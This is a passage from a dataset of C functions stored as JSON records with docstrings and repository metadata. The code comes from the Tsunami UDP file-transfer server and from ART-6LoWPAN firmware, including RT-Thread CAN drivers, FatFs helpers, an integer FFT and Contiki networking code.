F_SETFL, O_NONBLOCK);\n\tif (status < 0)\n\t    error(\"Could not make client socket non-blocking\");\n\n\t/*---------------------------\n\t * START TIMING\n\t *---------------------------*/\n\tgettimeofday(&start, NULL);\n\tif (param->transcript_yn)\n\t    xscript_data_start(session, &start);\n\n\t/* start by blasting out every block */\n\txfer->block = 0;\n\twhile (xfer->block <= param->block_count) {\n\n            /* default: flag as retransmitted block */\n            block_new = 0;\n\n\t    /* see if transmit requests are available */\n\t    gettimeofday(&delay, NULL);\n\t    result = read(session->client_fd, &retransmission, sizeof(retransmission));\n\t    if ((result <= 0) && (errno != EAGAIN))\n\t\terror(\"Retransmission read failed\");\n\n\t    /* if we have a retransmission */\n\t    if (result == sizeof(retransmission_t)) {\n\n\t\t/* if it's a stop request, go back to waiting for a filename */\n\t\tif (ntohs(retransmission.request_type) == REQUEST_STOP) {\n\t\t    fprintf(stderr, \"Transmission complete.\\n\");\n\t\t    break;\n\t\t}\n\n\t\t/* otherwise, handle the retransmission */\n\t\tstatus = ttp_accept_retransmit(session, &retransmission, datagram);\n\t\tif (status < 0)\n\t\t    warn(\"Retransmission error\");\n\t\tusleep_that_works(75);\n\n\t    /* if we have no retransmission */\n\t    } else if (result <= 0) {\n\n\t\t/* build the block */\n\t\txfer->block = min(xfer->block + 1, param->block_count);\n\t\tresult = build_datagram(session, xfer->block, (xfer->block == param->block_count) ? TS_BLOCK_TERMINATE : TS_BLOCK_ORIGINAL, datagram);\n\t\tif (result < 0) {\n\t\t    sprintf(g_error, \"Could not read block #%u\", xfer->block);\n\t\t    error(g_error);\n\t\t}\n\n\t\t/* transmit the block */\n\t\tresult = sendto(xfer->udp_fd, datagram, 6 + param->block_size, 0, xfer->udp_address, xfer->udp_length);\n\t\tif (result < 0) {\n\t\t    sprintf(g_error, \"Could not transmit block #%u\", xfer->block);\n\t\t    warn(g_error);\n\t\t    continue;\n\t\t}\n                block_new = 1;\n\n\t    /* if we have a partial retransmission message */\n\t    } else if (result > 0) {\n\n\t\t/* loop until we clear out the broken message */\n\t\tint sofar = result;\n\t\twhile (sofar < sizeof(retransmission)) {\n\t\t    result = read(session->client_fd, &retransmission, sizeof(retransmission) - sofar);\n\t\t    if ((result < 0) && (errno != EAGAIN))\n\t\t\terror(\"Split message recovery failed\");\n\t\t    else if (result > 0)\n\t\t\tsofar += result;\n\t\t}\n\t\tcontinue;\n\t    }\n\n\t    /* delay for the next packet */\n\t    ipd_time = get_usec_since(&delay);\n\t    ipd_time = ((ipd_time + 50) < xfer->ipd_current) ? ((u_int64_t) (xfer->ipd_current - ipd_time - 50)) : 0;\n        usleep_that_works(ipd_time);\n\t}\n\n\t/*---------------------------\n\t * STOP TIMING\n\t *---------------------------*/\n\tgettimeofday(&stop, NULL);\n\tif (param->transcript_yn)\n\t    xscript_data_stop(session, &stop);\n\tdelta = 1000000LL * (stop.tv_sec - start.tv_sec) + stop.tv_usec - start.tv_usec;\n\n\t/* report on the transfer */\n        if (param->verbose_yn)\n            fprintf(stderr, \"Server %d transferred %llu bytes in %0.2f seconds (%0.1f Mbps)\\n\",\n                    session->session_id, param->file_size, delta / 1000000.0, 8.0 * param->file_size / delta);\n\n\t/* close the transcript */\n\tif (param->transcript_yn)\n\t    xscript_close(session, delta);\n\n    /* close the file */\n    mk5_fclose(xfer->file);\n    \n    /* close the UDP socket */\n    close(xfer->udp_fd);\n    memset(xfer, 0, sizeof(*xfer));\n\n    } //while(1)\n}", "path": "mk5server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * MAIN PROGRAM\n *------------------------------------------------------------------------*/\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n    int                server_fd, client_fd;\n    struct sockaddr_in remote_address;\n    socklen_t          remote_length = sizeof(struct sockaddr_in);\n    ttp_parameter_t    parameter;\n    ttp_session_t      session;\n    pid_t              child_pid;\n\n    /* initialize our parameters */\n    memset(&session, 0, sizeof(session));\n    reset_server(&parameter);\n\n    /* process our command-line options */\n    process_options(argc, argv, &parameter);\n\n    /* obtain our server socket */\n    server_fd = create_tcp_socket(&parameter);\n    if (server_fd < 0) {\n        sprintf(g_error, \"Could not create server socket on port %d\", parameter.tcp_port);\n        return error(g_error);\n    }\n\n    /* install a signal handler for our children */\n    signal(SIGCHLD, reap);\n\n    /* now show version / build information */\n    fprintf(stderr, \"Tsunami Mark5 Server for protocol rev %X\\nRevision: %s\\nCompiled: %s %s\\n\"\n                    \"Waiting for clients to connect.\\n\",\n            PROTOCOL_REVISION, TSUNAMI_CVS_BUILDNR, __DATE__ , __TIME__);\n    \n    /* while our little world keeps turning */\n    while (1) {\n\n        /* accept a new client connection */\n        client_fd = accept(server_fd, (struct sockaddr *) &remote_address, &remote_length);\n        if (client_fd < 0) {\n            warn(\"Could not accept client connection\");\n            continue;\n        }\n    \n        /* and fork a new child process to handle it */\n        child_pid = fork();\n        if (child_pid < 0) {\n            warn(\"Could not create child process\");\n            continue;\n        }\n       session.session_id++;\n    \n        /* if we're the child */\n        if (child_pid == 0) {\n    \n            /* close the server socket */\n            close(server_fd);\n    \n            /* set up the session structure */\n            session.client_fd = client_fd;\n            session.parameter = &parameter;\n            memset(&session.transfer, 0, sizeof(session.transfer));\n    \n            /* and run the client handler */\n            client_handler(&session);\n            return 0;\n    \n        /* if we're the parent */\n        } else {\n    \n            /* close the client socket */\n            close(client_fd);\n        }\n    }\n}", "path": "mk5server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int ttp_negotiate(ttp_session_t *session);\n *\n * Performs all of the negotiation with the client that is done prior\n * to authentication.  At the moment, this consists of verifying\n * identical protocol revisions between the client and server.  Returns\n * 0 on success and non-zero on failure.\n *\n * Values are transmitted in network byte order.\n *------------------------------------------------------------------------*/\n", "func_signal": "int ttp_negotiate(ttp_session_t *session)", "code": "{\n    u_int32_t server_revision = htonl(PROTOCOL_REVISION);\n    u_int32_t client_revision;\n    int       status;\n\n    /* send our protocol revision number to the client */\n    status = full_write(session->client_fd, &server_revision, 4);\n    if (status < 0)\n\treturn warn(\"Could not send protocol revision number\");\n\n    /* read the protocol revision number from the client */\n    status = full_read(session->client_fd, &client_revision, 4);\n    if (status < 0)\n\treturn warn(\"Could not read protocol revision number\");\n\n    /* compare the numbers */\n    return (client_revision == server_revision) ? 0 : -1;\n}", "path": "rtserver\\protocol.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int ttp_open_port(ttp_session_t *session);\n *\n * Creates a new UDP socket for transmitting the file data associated\n * with our pending transfer and receives the destination port number\n * from the client.  Returns 0 on success and non-zero on failure.\n *------------------------------------------------------------------------*/\n", "func_signal": "int ttp_open_port(ttp_session_t *session)", "code": "{\n    struct sockaddr    *address;\n    int                 status;\n    u_int16_t           port;\n    u_char              ipv6_yn = session->parameter->ipv6_yn;\n\n    /* create the address structure */\n    session->transfer.udp_length = ipv6_yn ? sizeof(struct sockaddr_in6) : sizeof(struct sockaddr_in);\n    address = (struct sockaddr *) malloc(session->transfer.udp_length);\n    if (address == NULL)\n\terror(\"Could not allocate space for UDP socket address\");\n\n    /* prepare the UDP address structure, minus the UDP port number */\n    getpeername(session->client_fd, address, &(session->transfer.udp_length));\n\n    /* read in the port number from the client */\n    status = full_read(session->client_fd, &port, 2);\n    if (status < 0)\n\treturn warn(\"Could not read UDP port number\");\n    if (ipv6_yn)\n\t((struct sockaddr_in6 *) address)->sin6_port = port;\n    else\n\t((struct sockaddr_in *)  address)->sin_port  = port;\n\n    /* print out the port number */\n    if (session->parameter->verbose_yn)\n\tprintf(\"Sending to client port %d\\n\", ntohs(port));\n\n    /* open a new datagram socket */\n    session->transfer.udp_fd = create_udp_socket(session->parameter);\n    if (session->transfer.udp_fd < 0)\n\treturn warn(\"Could not create UDP socket\");\n\n    /* we succeeded */\n    session->transfer.udp_address = address;\n    return 0;\n}", "path": "rtserver\\protocol.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int create_udp_socket(ttp_parameter_t *parameter);\n *\n * Establishes a new UDP socket for data transfer, returning the file\n * descriptor of the socket on success and a negative value on error.\n * This will be an IPv6 socket if ipv6_yn is true and an IPv4 socket\n * otherwise.\n *------------------------------------------------------------------------*/\n", "func_signal": "int create_udp_socket(ttp_parameter_t *parameter)", "code": "{\n    int socket_fd;\n    int status;\n    int yes = 1;\n\n    /* create the socket */\n    socket_fd = socket(parameter->ipv6_yn ? AF_INET6 : AF_INET, SOCK_DGRAM, 0);\n    if (socket_fd < 0)\n\treturn warn(\"Error in creating UDP socket\");\n\n    /* make the socket reuseable */\n    status = setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));\n    if (status < 0) {\n\tclose(socket_fd);\n\treturn warn(\"Error in configuring UDP socket\");\n    }\n\n    /* set the transmit buffer size */\n    status = setsockopt(socket_fd, SOL_SOCKET, SO_SNDBUF, &parameter->udp_buffer, sizeof(parameter->udp_buffer));\n    if (status < 0) {\n\twarn(\"Error in resizing UDP transmit buffer\");\n    }\n\n    /* return the file desscriptor */\n    return socket_fd;\n}", "path": "rtserver\\network.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/* Check if chr is contained in the string */\n", "func_signal": "static\nint chk_chr (const char* str, int chr)", "code": "{\t/* NZ:contained, ZR:not contained */\n\twhile (*str && *str != chr) str++;\n\treturn *str;\n}", "path": "firmware\\app\\rt-thread\\components\\dfs\\filesystems\\elmfat\\ff.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/* ifft(xre[], n) - integer (fixpoint) version of Fast Fourier Transform\n   An integer version of FFT that takes in-samples in an int16_t array\n   and does an fft on n samples in the array.\n   The result of the FFT is stored in the same array as the samples\n   was stored. Them imaginary part of the result is stored in xim which\n   needs to be of the same size as xre (e.g. n ints).\n\n   Note: This fft is designed to be used with 8 bit values (e.g. not\n   16 bit values). The reason for the int16_t array is for keeping some\n   'room' for the calculations. It is also designed for doing fairly small\n   FFT:s since to large sample arrays might cause it to overflow during\n   calculations.\n*/\n", "func_signal": "void\nifft(int16_t xre[], int16_t xim[], uint16_t n)", "code": "{\n  uint16_t nu;\n  uint16_t n2;\n  uint16_t nu1;\n  int p, k, l, i;\n  int32_t c, s, tr, ti;\n\n  nu = ilog2(n);\n  nu1 = nu - 1;\n  n2 = n / 2;\n\n  for (i = 0; i < n; i++)\n    xim[i] = 0;\n\n  for (l = 1; l <= nu; l++) {\n    for (k = 0; k < n; k += n2) {\n      for (i = 1; i <= n2; i++) {\n\tp = bitrev(k >> nu1, nu);\n\tc = cosI((1000 * p) / n);\n\ts = sinI((1000 * p) / n);\n\n\ttr = ((xre[k + n2] * c + xim[k + n2] * s) >> RESOLUTION);\n\tti = ((xim[k + n2] * c - xre[k + n2] * s) >> RESOLUTION);\n\n\txre[k + n2] = xre[k] - tr;\n\txim[k + n2] = xim[k] - ti;\n\txre[k] += tr;\n\txim[k] += ti;\n\tk++;\n      }\n    }\n    nu1--;\n    n2 = n2 / 2;\n  }\n\n  for (k = 0; k < n; k++) {\n    p = bitrev(k, nu);\n    if (p > k) {\n      n2 = xre[k];\n      xre[k] = xre[p];\n      xre[p] = n2;\n\n      n2 = xim[k];\n      xim[k] = xim[p];\n      xim[p] = n2;\n    }\n  }\n\n  /* This is a fast but not 100% correct magnitude calculation */\n  /* Should be sqrt(xre[i]^2 + xim[i]^2) and normalized with div. by n */\n  for (i = 0, n2 = n / 2; i < n2; i++) {\n    xre[i] = (ABS(xre[i]) + ABS(xim[i]));\n  }\n}", "path": "firmware\\app\\components\\contiki\\core\\lib\\ifft.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/**\n * This function will set current tick\n */\n", "func_signal": "void rt_tick_set(rt_tick_t tick)", "code": "{\n    rt_base_t level;\n\n    level = rt_hw_interrupt_disable();\n    rt_tick = tick;\n    rt_hw_interrupt_enable(level);\n}", "path": "firmware\\app\\rt-thread\\src\\clock.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*\n * can interrupt routines\n */\n", "func_signal": "rt_inline int _can_int_rx(struct rt_can_device *can, struct rt_can_msg *data, int msgs)", "code": "{\n    int size;\n    struct rt_can_rx_fifo *rx_fifo;\n    RT_ASSERT(can != RT_NULL);\n    size = msgs;\n\n    rx_fifo = (struct rt_can_rx_fifo *) can->can_rx;\n    RT_ASSERT(rx_fifo != RT_NULL);\n\n    /* read from software FIFO */\n    while (msgs)\n    {\n        rt_base_t level;\n#ifdef RT_CAN_USING_HDR\n        rt_int32_t hdr;\n#endif /*RT_CAN_USING_HDR*/\n        struct rt_can_msg_list *listmsg = RT_NULL;\n\n        /* disable interrupt */\n        level = rt_hw_interrupt_disable();\n#ifdef RT_CAN_USING_HDR\n        hdr = data->hdr;\n\n        if (hdr >= 0 && can->hdr && hdr < can->config.maxhdr && !rt_list_isempty(&can->hdr[hdr].list))\n        {\n            listmsg = rt_list_entry(can->hdr[hdr].list.next, struct rt_can_msg_list, hdrlist);\n            rt_list_remove(&listmsg->list);\n            rt_list_remove(&listmsg->hdrlist);\n            if (can->hdr[hdr].msgs)\n            {\n                can->hdr[hdr].msgs--;\n            }\n            listmsg->owner = RT_NULL;\n        }\n        else if (hdr == -1)\n#endif /*RT_CAN_USING_HDR*/\n        {\n            if (!rt_list_isempty(&rx_fifo->uselist))\n            {\n                listmsg = rt_list_entry(rx_fifo->uselist.next, struct rt_can_msg_list, list);\n                rt_list_remove(&listmsg->list);\n#ifdef RT_CAN_USING_HDR\n                rt_list_remove(&listmsg->hdrlist);\n                if (listmsg->owner != RT_NULL && listmsg->owner->msgs)\n                {\n                    listmsg->owner->msgs--;\n                }\n                listmsg->owner = RT_NULL;\n#endif /*RT_CAN_USING_HDR*/\n            }\n            else\n            {\n                /* no data, enable interrupt and break out */\n                rt_hw_interrupt_enable(level);\n                break;\n            }\n        }\n\n        /* enable interrupt */\n        rt_hw_interrupt_enable(level);\n        if (listmsg != RT_NULL)\n        {\n            rt_memcpy(data, &listmsg->data, sizeof(struct rt_can_msg));\n\n            level = rt_hw_interrupt_disable();\n            rt_list_insert_before(&rx_fifo->freelist, &listmsg->list);\n            rx_fifo->freenumbers++;\n            RT_ASSERT(rx_fifo->freenumbers <= can->config.msgboxsz);\n            rt_hw_interrupt_enable(level);\n\n            listmsg = RT_NULL;\n        }\n        else\n        {\n            break;\n        }\n        data ++;\n        msgs -= sizeof(struct rt_can_msg);\n    }\n\n    return (size - msgs);\n}", "path": "firmware\\app\\rt-thread\\components\\drivers\\can\\can.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static int\noutput(struct channel *c)", "code": "{\n  const struct packetbuf_attrlist *a;\n  int byteptr, len;\n  uint8_t *hdrptr;\n  struct raw_hdr *hdr;\n  \n  /* Compute the total size of the final header by summing the size of\n     all attributes that are used on this channel. */\n  if(packetbuf_hdralloc(c->hdrsize + sizeof(struct raw_hdr)) == 0) {\n    PRINTF(\"chameleon-raw: insufficient space for headers\\n\");\n    return 0;\n  }\n  hdr = (struct raw_hdr *)packetbuf_hdrptr();\n  hdr->channel[0] = c->channelno & 0xff;\n  hdr->channel[1] = (c->channelno >> 8) & 0xff;\n\n  hdrptr = ((uint8_t *)packetbuf_hdrptr()) + sizeof(struct raw_hdr);\n  byteptr = 0;\n  for(a = c->attrlist; a->type != PACKETBUF_ATTR_NONE; ++a) {\n#if CHAMELEON_WITH_MAC_LINK_ADDRESSES\n    if(a->type == PACKETBUF_ADDR_SENDER ||\n       a->type == PACKETBUF_ADDR_RECEIVER) {\n      /* Let the link layer handle sender and receiver */\n      PRINTF(\"%d.%d: pack_header leaving sender/receiver to link layer\\n\");\n      continue;\n    }\n#endif /* CHAMELEON_WITH_MAC_LINK_ADDRESSES */\n    PRINTF(\"%d.%d: pack_header type %d, len %d\\n\",\n\t   linkaddr_node_addr.u8[0], linkaddr_node_addr.u8[1],\n\t   a->type, a->len);\n    len = (a->len & 0xf8) + ((a->len & 7) ? 8: 0);\n    if(PACKETBUF_IS_ADDR(a->type)) {\n      const linkaddr_t *linkaddr;\n      /*      memcpy(&hdrptr[byteptr], (uint8_t *)packetbuf_attr_aget(a->type), len / 8);*/\n      linkaddr = packetbuf_addr(a->type);\n      hdrptr[byteptr] = linkaddr->u8[0];\n      hdrptr[byteptr + 1] = linkaddr->u8[1];\n      \n      PRINTF(\"%d.%d: address %d.%d\\n\",\n\t    linkaddr_node_addr.u8[0], linkaddr_node_addr.u8[1],\n\t    ((uint8_t *)packetbuf_addr(a->type))[0],\n\t    ((uint8_t *)packetbuf_addr(a->type))[1]);\n    } else {\n      packetbuf_attr_t val;\n      val = packetbuf_attr(a->type);\n      memcpy(&hdrptr[byteptr], &val, len / 8);\n      PRINTF(\"%d.%d: value %d\\n\",\n\t    linkaddr_node_addr.u8[0], linkaddr_node_addr.u8[1],\n\t    val);\n    }\n    byteptr += len / 8;\n  }\n\n  return 1; /* Send out packet */\n}", "path": "firmware\\app\\components\\contiki\\core\\net\\rime\\chameleon-raw.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/* Copy memory to memory */\n", "func_signal": "static\nvoid mem_cpy (void* dst, const void* src, UINT cnt)", "code": "{\n\tBYTE *d = (BYTE*)dst;\n\tconst BYTE *s = (const BYTE*)src;\n\n\tif (cnt) {\n\t\tdo *d++ = *s++; while (--cnt);\n\t}\n}", "path": "firmware\\app\\rt-thread\\components\\dfs\\filesystems\\elmfat\\ff.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/**\n * This function will notify kernel there is one tick passed. Normally,\n * this function is invoked by clock ISR.\n */\n", "func_signal": "void rt_tick_increase(void)", "code": "{\n    struct rt_thread *thread;\n\n    /* increase the global tick */\n    ++ rt_tick;\n\n    /* check time slice */\n    thread = rt_thread_self();\n\n    -- thread->remaining_tick;\n    if (thread->remaining_tick == 0)\n    {\n        /* change to initialized tick */\n        thread->remaining_tick = thread->init_tick;\n\n        /* yield */\n        rt_thread_yield();\n    }\n\n    /* check timer */\n    rt_timer_check();\n}", "path": "firmware\\app\\rt-thread\\src\\clock.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\ninput_callback(void)", "code": "{\n  /*PRINTF(\"SIN: %u\\n\", uip_len);*/\n  if(uip_buf[0] == '!') {\n    PRINTF(\"Got configuration message of type %c\\n\", uip_buf[1]);\n    uip_clear_buf();\n#if 0\n    if(uip_buf[1] == 'P') {\n      uip_ipaddr_t prefix;\n      /* Here we set a prefix !!! */\n      memset(&prefix, 0, 16);\n      memcpy(&prefix, &uip_buf[2], 8);\n      PRINTF(\"Setting prefix \");\n      PRINT6ADDR(&prefix);\n      PRINTF(\"\\n\");\n      set_prefix_64(&prefix);\n    }\n#endif\n  } else if(uip_buf[0] == '?') {\n    PRINTF(\"Got request message of type %c\\n\", uip_buf[1]);\n    if(uip_buf[1] == 'M') {\n      const char *hexchar = \"0123456789abcdef\";\n      int j;\n      /* this is just a test so far... just to see if it works */\n      uip_buf[0] = '!';\n      for(j = 0; j < 8; j++) {\n        uip_buf[2 + j * 2] = hexchar[uip_lladdr.addr[j] >> 4];\n        uip_buf[3 + j * 2] = hexchar[uip_lladdr.addr[j] & 15];\n      }\n      uip_len = 18;\n      slip_send();\n      \n    }\n    uip_clear_buf();\n  } else {\n    \n    /* Save the last sender received over SLIP to avoid bouncing the\n       packet back if no route is found */\n    uip_ipaddr_copy(&last_sender, &UIP_IP_BUF->srcipaddr);\n    \n    uint16_t len = ip64_4to6(&uip_buf[UIP_LLH_LEN], uip_len, \n\t\t\t     ip64_packet_buffer);\n    if(len > 0) {\n      memcpy(&uip_buf[UIP_LLH_LEN], ip64_packet_buffer, len);\n      uip_len = len;\n      /*      PRINTF(\"send len %d\\n\", len); */\n    } else {\n      uip_clear_buf();\n    }\n  }\n}", "path": "firmware\\app\\components\\contiki\\core\\net\\ip64\\ip64-slip-interface.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\ninit(void)", "code": "{\n  PRINTF(\"ip64-slip-interface: init\\n\");\n  //  slip_arch_init(BAUD2UBR(115200));\n  process_start(&slip_process, NULL);\n  slip_set_input_callback(input_callback);\n}", "path": "firmware\\app\\components\\contiki\\core\\net\\ip64\\ip64-slip-interface.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/* Fill memory block */\n", "func_signal": "static\nvoid mem_set (void* dst, int val, UINT cnt)", "code": "{\n\tBYTE *d = (BYTE*)dst;\n\n\tdo *d++ = (BYTE)val; while (--cnt);\n}", "path": "firmware\\app\\rt-thread\\components\\dfs\\filesystems\\elmfat\\ff.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static struct channel *\ninput(void)", "code": "{\n  const struct packetbuf_attrlist *a;\n  int byteptr, bitptr, len;\n  uint8_t *hdrptr;\n  struct raw_hdr *hdr;\n  struct channel *c;\n\n  /* The packet has a header that tells us what channel the packet is\n     for. */\n  hdr = (struct raw_hdr *)packetbuf_dataptr();\n  if(packetbuf_hdrreduce(sizeof(struct raw_hdr)) == 0) {\n    PRINTF(\"chameleon-raw: too short packet\\n\");\n    return NULL;\n  }\n  c = channel_lookup((hdr->channel[1] << 8) + hdr->channel[0]);\n  if(c == NULL) {\n    PRINTF(\"chameleon-raw: input: channel %u not found\\n\",\n           (hdr->channel[1] << 8) + hdr->channel[0]);\n    return NULL;\n  }\n\n  hdrptr = packetbuf_dataptr();\n  if(packetbuf_hdrreduce(c->hdrsize) == 0) {\n    PRINTF(\"chameleon-raw: too short packet\\n\");\n    return NULL;\n  }\n  byteptr = bitptr = 0;\n  for(a = c->attrlist; a->type != PACKETBUF_ATTR_NONE; ++a) {\n#if CHAMELEON_WITH_MAC_LINK_ADDRESSES\n    if(a->type == PACKETBUF_ADDR_SENDER ||\n       a->type == PACKETBUF_ADDR_RECEIVER) {\n      /* Let the link layer handle sender and receiver */\n      continue;\n    }\n#endif /* CHAMELEON_WITH_MAC_LINK_ADDRESSES */\n    PRINTF(\"%d.%d: unpack_header type %d, len %d\\n\",\n\t   linkaddr_node_addr.u8[0], linkaddr_node_addr.u8[1],\n\t   a->type, a->len);\n    len = (a->len & 0xf8) + ((a->len & 7) ? 8: 0);\n    if(PACKETBUF_IS_ADDR(a->type)) {\n      const linkaddr_t addr;\n      memcpy((uint8_t *)&addr, &hdrptr[byteptr], len / 8);\n      PRINTF(\"%d.%d: unpack_header type %d, addr %d.%d\\n\",\n\t     linkaddr_node_addr.u8[0], linkaddr_node_addr.u8[1],\n\t     a->type, addr.u8[0], addr.u8[1]);\n      packetbuf_set_addr(a->type, &addr);\n    } else {\n      packetbuf_attr_t val = 0;\n      memcpy((uint8_t *)&val, &hdrptr[byteptr], len / 8);\n\n      packetbuf_set_attr(a->type, val);\n      PRINTF(\"%d.%d: unpack_header type %d, val %d\\n\",\n\t     linkaddr_node_addr.u8[0], linkaddr_node_addr.u8[1],\n\t     a->type, val);\n    }\n    byteptr += len / 8;\n  }\n  return c;\n}", "path": "firmware\\app\\components\\contiki\\core\\net\\rime\\chameleon-raw.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*\n * can timer\n */\n", "func_signal": "static void cantimeout(void *arg)", "code": "{\n    rt_can_t can = (rt_can_t)arg;\n\n    rt_device_control((rt_device_t)can, RT_CAN_CMD_GET_STATUS, (void *)&can->status);\n\n    if (can->status_indicate.ind != RT_NULL)\n    {\n        can->status_indicate.ind(can, can->status_indicate.args);\n    }\n#ifdef RT_CAN_USING_BUS_HOOK\n    if(can->bus_hook)\n    {\n        can->bus_hook(can);\n    }\n#endif /*RT_CAN_USING_BUS_HOOK*/\n    if (can->timerinitflag == 1)\n    {\n        can->timerinitflag = 0xFF;\n    }\n}", "path": "firmware\\app\\rt-thread\\components\\drivers\\can\\can.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/* ISR for can interrupt */\n", "func_signal": "void rt_hw_can_isr(struct rt_can_device *can, int event)", "code": "{\n    switch (event & 0xff)\n    {\n    case RT_CAN_EVENT_RXOF_IND:\n    {\n        rt_base_t level;\n        level = rt_hw_interrupt_disable();\n        can->status.dropedrcvpkg++;\n        rt_hw_interrupt_enable(level);\n    }\n    case RT_CAN_EVENT_RX_IND:\n    {\n        struct rt_can_msg tmpmsg;\n        struct rt_can_rx_fifo *rx_fifo;\n        struct rt_can_msg_list *listmsg = RT_NULL;\n#ifdef RT_CAN_USING_HDR\n        rt_int32_t hdr;\n#endif\n        int ch = -1;\n        rt_base_t level;\n        rt_uint32_t no;\n\n        rx_fifo = (struct rt_can_rx_fifo *)can->can_rx;\n        RT_ASSERT(rx_fifo != RT_NULL);\n        /* interrupt mode receive */\n        RT_ASSERT(can->parent.open_flag & RT_DEVICE_FLAG_INT_RX);\n\n        no = event >> 8;\n        ch = can->ops->recvmsg(can, &tmpmsg, no);\n        if (ch == -1) break;\n\n        /* disable interrupt */\n        level = rt_hw_interrupt_disable();\n        can->status.rcvpkg++;\n        can->status.rcvchange = 1;\n        if (!rt_list_isempty(&rx_fifo->freelist))\n        {\n            listmsg = rt_list_entry(rx_fifo->freelist.next, struct rt_can_msg_list, list);\n            rt_list_remove(&listmsg->list);\n#ifdef RT_CAN_USING_HDR\n            rt_list_remove(&listmsg->hdrlist);\n            if (listmsg->owner != RT_NULL && listmsg->owner->msgs)\n            {\n                listmsg->owner->msgs--;\n            }\n            listmsg->owner = RT_NULL;\n#endif /*RT_CAN_USING_HDR*/\n            RT_ASSERT(rx_fifo->freenumbers > 0);\n            rx_fifo->freenumbers--;\n        }\n        else if (!rt_list_isempty(&rx_fifo->uselist))\n        {\n            listmsg = rt_list_entry(rx_fifo->uselist.next, struct rt_can_msg_list, list);\n            can->status.dropedrcvpkg++;\n            rt_list_remove(&listmsg->list);\n#ifdef RT_CAN_USING_HDR\n            rt_list_remove(&listmsg->hdrlist);\n            if (listmsg->owner != RT_NULL && listmsg->owner->msgs)\n            {\n                listmsg->owner->msgs--;\n            }\n            listmsg->owner = RT_NULL;\n#endif\n        }\n        /* enable interrupt */\n        rt_hw_interrupt_enable(level);\n\n        if (listmsg != RT_NULL)\n        {\n            rt_memcpy(&listmsg->data, &tmpmsg, sizeof(struct rt_can_msg));\n            level = rt_hw_interrupt_disable();\n            rt_list_insert_before(&rx_fifo->uselist, &listmsg->list);\n#ifdef RT_CAN_USING_HDR\n            hdr = tmpmsg.hdr;\n            if (can->hdr != RT_NULL)\n            {\n                RT_ASSERT(hdr < can->config.maxhdr && hdr >= 0);\n                if (can->hdr[hdr].connected)\n                {\n                    rt_list_insert_before(&can->hdr[hdr].list, &listmsg->hdrlist);\n                    listmsg->owner = &can->hdr[hdr];\n                    can->hdr[hdr].msgs++;\n                }\n\n            }\n#endif\n            rt_hw_interrupt_enable(level);\n        }\n\n        /* invoke callback */\n#ifdef RT_CAN_USING_HDR\n        if (can->hdr != RT_NULL && can->hdr[hdr].connected && can->hdr[hdr].filter.ind)\n        {\n            rt_size_t rx_length;\n            RT_ASSERT(hdr < can->config.maxhdr && hdr >= 0);\n\n            level = rt_hw_interrupt_disable();\n            rx_length = can->hdr[hdr].msgs * sizeof(struct rt_can_msg);\n            rt_hw_interrupt_enable(level);\n            can->hdr[hdr].filter.ind(&can->parent, can->hdr[hdr].filter.args, hdr, rx_length);\n        }\n        else\n#endif\n        {\n            if (can->parent.rx_indicate != RT_NULL)\n            {\n                rt_size_t rx_length;\n\n                level = rt_hw_interrupt_disable();\n                /* get rx length */\n                rx_length = rx_fifo->freenumbers * sizeof(struct rt_can_msg);\n                rt_hw_interrupt_enable(level);\n\n                can->parent.rx_indicate(&can->parent, rx_length);\n            }\n        }\n        break;\n    }\n\n    case RT_CAN_EVENT_TX_DONE:\n    case RT_CAN_EVENT_TX_FAIL:\n    {\n        struct rt_can_tx_fifo *tx_fifo;\n        rt_uint32_t no;\n        no = event >> 8;\n        tx_fifo = (struct rt_can_tx_fifo *) can->can_tx;\n        RT_ASSERT(tx_fifo != RT_NULL);\n\n        if ((event & 0xff) == RT_CAN_EVENT_TX_DONE)\n        {\n            tx_fifo->buffer[no].result = RT_CAN_SND_RESULT_OK;\n        }\n        else\n        {\n            tx_fifo->buffer[no].result = RT_CAN_SND_RESULT_ERR;\n        }\n        rt_completion_done(&(tx_fifo->buffer[no].completion));\n        break;\n    }\n    }\n}", "path": "firmware\\app\\rt-thread\\components\\drivers\\can\\can.c", 